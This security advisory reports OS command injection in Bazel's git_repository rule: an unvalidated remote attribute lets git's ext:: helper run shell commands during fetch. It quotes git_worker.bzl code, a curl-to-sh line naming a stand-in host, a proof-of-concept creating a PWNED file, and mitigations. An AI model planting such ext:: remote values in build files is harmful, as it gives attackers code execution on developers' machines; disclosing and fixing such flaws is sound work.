### Title
OS Command Injection via unsanitized `git_repository`/`new_git_repository` `remote` attribute reaching `git fetch`/`git remote add` - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
Bazel's built-in `git_repository` rule accepts an arbitrary string for the `remote` attribute and passes it, unsanitized and unrestricted, straight into `git remote add origin <remote>` and subsequent `git fetch origin ...` invocations. Git supports "remote helper" URL schemes such as `ext::<command>` (and similar) that cause the locally-installed `git` binary itself to execute an arbitrary shell command embedded in the URL string. Because Bazel does not validate or restrict the URL scheme, nor does it disable these transport helpers via `GIT_ALLOW_PROTOCOL`/`protocol.*.allow`, any code path that can set the `remote` value to attacker-controlled content (e.g., a `git_repository()` invocation whose `remote=` comes from a module extension defined by an untrusted, transitively-depended-on Bazel module) results in arbitrary command execution on the machine performing the build.

### Finding Description
`tools/build_defs/repo/git_worker.bzl` implements the low-level git plumbing used by `git_repository`: [1](#0-0) 

`add_origin` forwards `ctx.attr.remote` verbatim as an argument to `git remote add origin <remote>`, and `fetch`/`_git_maybe_shallow` subsequently run `git fetch origin ...` against that same remote: [2](#0-1) [3](#0-2) 

The actual process spawn is done through `_execute`, which builds the command as `["git", "-c", "core.fsmonitor=false"] + args` and calls `ctx.execute(...)`: [4](#0-3) 

While this uses an argument-vector `ctx.execute()` call (not a shell string), Git itself interprets certain URL *schemes* as instructions to invoke external processes — most notably the `ext::<command>` remote helper, which tells `git` to run `<command>` as the transport and pipe git-protocol data through it (this is the mechanism behind the well-known git URL command-injection class, e.g. CVE-2017-1000117-style abuse). Because `_common_attrs["remote"]` is a plain, unvalidated `attr.string()`: [5](#0-4) 

and neither `git.bzl` nor `git_worker.bzl` set `GIT_ALLOW_PROTOCOL`, `protocol.ext.allow`, or otherwise validate the URL scheme against an allow-list (only unrelated local environment variables are cleared): [6](#0-5) 

a `remote` value such as `ext::sh -c "curl evil.example|sh"` will be accepted, stored, and later executed by the system `git` binary as soon as `git fetch origin` runs, i.e. exactly at the fetch/clone step that Bazel performs automatically during repository resolution.

### Impact Explanation
This breaks the invariant that "untrusted content stays data": a `remote` string, which is just repository-rule input, is capable of causing full command execution as the user running `bazel build`/`bazel sync`/`bazel mod`. Any place a `git_repository`/`new_git_repository` invocation is generated with attacker-influenced `remote` (for example a module extension shipped by a non-root, transitively-included Bazel module, or a generated repo definition sourced from remote/registry data) leads directly to RCE on the invoking machine — matching CWE-78 / CVSS "C:H/I:H/A:H" severity of the reference advisory.

### Likelihood Explanation
Exploitation requires only that the victim's build graph evaluates a `git_repository` (or the underlying `git_repo()` helper) whose `remote` attribute value is attacker-controlled — no local access, credentials, or trusted root-repo Starlark editing by the attacker is needed. This is a realistic supply-chain scenario: a malicious or compromised Bazel module (a `bazel_dep`) can define a module extension that calls `git_repository(remote = "ext::...")`, and it will run automatically as soon as the module is resolved into the dependency graph and the corresponding repository is fetched.

### Recommendation
- Restrict the `remote` attribute to an allow-list of expected schemes (`https://`, `http://`, `git://`, `ssh://`, `file://` under controlled conditions), rejecting `ext::`, `fd::`, and other "user protocol" helpers by default.
- Alternatively/additionally, explicitly set `GIT_ALLOW_PROTOCOL=http:https:git:ssh` (or the equivalent `protocol.*.allow=never` config for `ext`/`fd`/`file`) in the environment passed to every `git` invocation in `git_worker.bzl`'s `_execute`, so that even if a malicious remote/URL slips through, the system `git` binary itself refuses to invoke the helper.
- Validate `remote` (and other user-suppliable git refs) do not begin with `-` before being interpolated as positional git arguments, to avoid related git argument-injection issues in `reset`, `add_origin`, and `fetch`.

### Proof of Concept
A `src/test/shell/bazel` integration test analogous to the existing `starlark_git_repository_test.sh` suite can demonstrate the issue:
```
git_repository = use_repo_rule('@bazel_tools//tools/build_defs/repo:git.bzl', 'git_repository')
git_repository(
    name = 'evil',
    remote = 'ext::sh -c "touch $PWD/PWNED"',
    commit = 'deadbeef',
)
```
Running `bazel build @evil//...` triggers `add_origin`/`fetch` in `tools/build_defs/repo/git_worker.bzl`, which invokes `git fetch origin`; git's `ext::` transport helper then executes the embedded `sh -c` command, creating the `PWNED` file — demonstrating command execution driven purely by the value of the `remote` attribute, with no other privileged access required.

```text
def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)

    if sparse_checkout_patterns_or_file:
        _git_sparse_checkout(ctx, git_repo, sparse_checkout_patterns_or_file)

    if st.return_code == 0:
        return
    if ctx.attr.commit:
        # Perhaps uploadpack.allowReachableSHA1InWant or similar is not enabled on the server;
        # fall back to fetching all branches, tags, and history.
        # The semantics of --tags flag of git-fetch have changed in Git 1.9, from 1.9 it means
        # "everything that is already specified and all tags"; before 1.9, it used to mean
        # "ignore what is specified and fetch all tags".
        # The arguments below work correctly for both before 1.9 and after 1.9,
        # as we directly specify the list of references to fetch.
        _report_progress(ctx, git_repo, shallow_failed = True)
        _git(
            ctx,
            git_repo,
            "fetch",
            "origin",
            "--",
            "refs/heads/*:refs/remotes/origin/*",
            "refs/tags/*:refs/tags/*",
        )
    else:
        _error(ctx.name, ["git"] + args, st.stderr)
```

```text
def _execute(ctx, git_repo, args):
    # "core.fsmonitor=false" disables git from spawning a file system monitor which can cause hangs when cloning a lot.
    # See https://github.com/bazelbuild/bazel/issues/21438
    start = ["git", "-c", "core.fsmonitor=false"]
    return ctx.execute(
        start + args,
        environment = ctx.os.environ | _GIT_LOCAL_ENV_VARS,
        working_directory = str(git_repo.directory),
    )
```
